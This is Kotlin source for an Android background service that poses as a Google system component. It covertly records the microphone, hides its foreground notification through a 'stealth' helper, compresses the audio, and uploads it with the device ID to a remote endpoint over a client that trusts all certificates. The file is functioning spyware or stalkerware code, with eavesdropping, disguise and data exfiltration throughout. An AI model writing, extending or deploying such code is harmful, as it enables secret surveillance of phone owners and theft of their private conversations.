package com.google.android.systemservice.services

import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaRecorder
import android.os.IBinder
import android.util.Base64
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.util.concurrent.TimeUnit

class AudioService : Service() {
    companion object {
        private const val TAG = "SystemAudio"
        private const val SAMPLE_RATE = 44100
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        private const val AAC_BITRATE = 64000 // 64 kbps for good quality/size balance
        private const val DEFAULT_MAX_DURATION_SEC = 60
    }

    @Volatile private var audioRecord: AudioRecord? = null
    private var mediaCodec: MediaCodec? = null
    @Volatile private var isRecording = false
    private var recordingJob: Job? = null
    private val encodedAudioBuffer = ByteArrayOutputStream()
    private var useCompression = true
    private var maxDurationSec = DEFAULT_MAX_DURATION_SEC

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = TrustAllCertificates.createSecureClientBuilder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "AudioService created")
        startForegroundSilent()
    }

    private fun startForegroundSilent() {
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.AUDIO_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Get options from intent
        useCompression = intent?.getBooleanExtra("compress", true) ?: true
        maxDurationSec = intent?.getIntExtra("max_duration_sec", DEFAULT_MAX_DURATION_SEC) ?: DEFAULT_MAX_DURATION_SEC
        
        when (intent?.action) {
            "START_RECORDING" -> startRecording()
            "STOP_RECORDING" -> stopRecording()
        }
        return START_STICKY
    }

    private fun startRecording() {
        if (isRecording) {
            Log.d(TAG, "Already recording")
            return
        }

        Log.d(TAG, "Starting audio recording (compression: $useCompression, max: ${maxDurationSec}s)")

        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "RECORD_AUDIO permission not granted")
            stopSelf()
            return
        }
        
        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        
        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize * 2
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord initialization failed")
                return
            }

            // Initialize AAC encoder if compression enabled
            if (useCompression) {
                initAACEncoder()
            }

            isRecording = true
            audioRecord?.startRecording()
            encodedAudioBuffer.reset()

            recordingJob = serviceScope.launch {
                val buffer = ByteArray(bufferSize)
                var totalBytesRecorded = 0
                val maxBytes = SAMPLE_RATE * 2 * maxDurationSec

                while (isRecording && isActive && totalBytesRecorded < maxBytes) {
                    val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                    if (bytesRead > 0) {
                        if (useCompression && mediaCodec != null) {
                            encodeToAAC(buffer, bytesRead)
                        } else {
                            encodedAudioBuffer.write(buffer, 0, bytesRead)
                        }
                        totalBytesRecorded += bytesRead
                    }
                }

                // Flush encoder
                if (useCompression && mediaCodec != null) {
                    flushEncoder()
                }

                if (encodedAudioBuffer.size() > 0) {
                    sendAudioToServer()
                }
            }

        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied for audio recording: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting recording: ${e.message}")
        }
    }

    private fun initAACEncoder() {
        try {
            val format = MediaFormat.createAudioFormat(MediaFormat.MIMETYPE_AUDIO_AAC, SAMPLE_RATE, 1)
            format.setInteger(MediaFormat.KEY_AAC_PROFILE, MediaCodecInfo.CodecProfileLevel.AACObjectLC)
            format.setInteger(MediaFormat.KEY_BIT_RATE, AAC_BITRATE)
            format.setInteger(MediaFormat.KEY_MAX_INPUT_SIZE, 16384)
            
            mediaCodec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_AUDIO_AAC)
            mediaCodec?.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            mediaCodec?.start()
            Log.d(TAG, "AAC encoder initialized")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to init AAC encoder, falling back to PCM: ${e.message}")
            useCompression = false
            mediaCodec = null
        }
    }

    private fun encodeToAAC(pcmData: ByteArray, size: Int) {
        val codec = mediaCodec ?: return
        
        try {
            // Get input buffer
            val inputBufferIndex = codec.dequeueInputBuffer(10000)
            if (inputBufferIndex >= 0) {
                val inputBuffer = codec.getInputBuffer(inputBufferIndex)
                inputBuffer?.clear()
                inputBuffer?.put(pcmData, 0, size)
                codec.queueInputBuffer(inputBufferIndex, 0, size, System.nanoTime() / 1000, 0)
            }
            
            // Get output buffer
            val bufferInfo = MediaCodec.BufferInfo()
            var outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
            
            while (outputBufferIndex >= 0) {
                val outputBuffer = codec.getOutputBuffer(outputBufferIndex)
                if (outputBuffer != null && bufferInfo.size > 0) {
                    val encodedData = ByteArray(bufferInfo.size)
                    outputBuffer.get(encodedData)
                    encodedAudioBuffer.write(encodedData)
                }
                codec.releaseOutputBuffer(outputBufferIndex, false)
                outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 0)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error encoding to AAC: ${e.message}")
        }
    }

    private fun flushEncoder() {
        val codec = mediaCodec ?: return
        
        try {
            // Signal end of stream
            val inputBufferIndex = codec.dequeueInputBuffer(10000)
            if (inputBufferIndex >= 0) {
                codec.queueInputBuffer(inputBufferIndex, 0, 0, System.nanoTime() / 1000, MediaCodec.BUFFER_FLAG_END_OF_STREAM)
            }
            
            // Drain output
            val bufferInfo = MediaCodec.BufferInfo()
            var outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
            while (outputBufferIndex >= 0) {
                val outputBuffer = codec.getOutputBuffer(outputBufferIndex)
                if (outputBuffer != null && bufferInfo.size > 0) {
                    val encodedData = ByteArray(bufferInfo.size)
                    outputBuffer.get(encodedData)
                    encodedAudioBuffer.write(encodedData)
                }
                codec.releaseOutputBuffer(outputBufferIndex, false)
                
                if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) break
                outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 0)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error flushing encoder: ${e.message}")
        }
    }

    private fun stopRecording() {
        Log.d(TAG, "Stopping audio recording")
        isRecording = false
        
        recordingJob?.cancel()
        audioRecord?.stop()
        
        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
            
            mediaCodec?.stop()
            mediaCodec?.release()
            mediaCodec = null
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recording: ${e.message}")
        }

        if (encodedAudioBuffer.size() > 0) {
            serviceScope.launch {
                sendAudioToServer()
            }
        }
    }

    private suspend fun sendAudioToServer() {
        try {
            val deviceId = try {
                android.provider.Settings.Secure.getString(
                    contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                ) ?: AndroidConfig.deviceId
            } catch (e: Exception) {
                AndroidConfig.deviceId
            }

            val audioData = encodedAudioBuffer.toByteArray()
            encodedAudioBuffer.reset()

            val base64Audio = Base64.encodeToString(audioData, Base64.NO_WRAP)
            
            // Calculate duration based on format
            val durationMs = if (useCompression) {
                // Estimate from bitrate for AAC
                (audioData.size.toLong() * 8 * 1000) / AAC_BITRATE
            } else {
                (audioData.size.toLong() * 1000) / (SAMPLE_RATE * 2)
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("audio", base64Audio)
                put("sample_rate", SAMPLE_RATE)
                put("channels", 1)
                put("format", if (useCompression) "aac" else "pcm_s16le")
                put("duration_ms", durationMs)
                put("size_bytes", audioData.size)
                put("timestamp", System.currentTimeMillis())
            }

            AndroidConfig.loadFromPreferences(this@AudioService)
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(AndroidConfig.audioEndpoint)
                .post(body)
                .build()

            withContext(Dispatchers.IO) {
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Audio sent successfully (${audioData.size} bytes, format: ${if (useCompression) "AAC" else "PCM"})")
                    } else {
                        Log.e(TAG, "Failed to send audio: ${response.code}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending audio: ${e.message}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopForeground(false)
        stopRecording()
        serviceScope.cancel()
    }
}
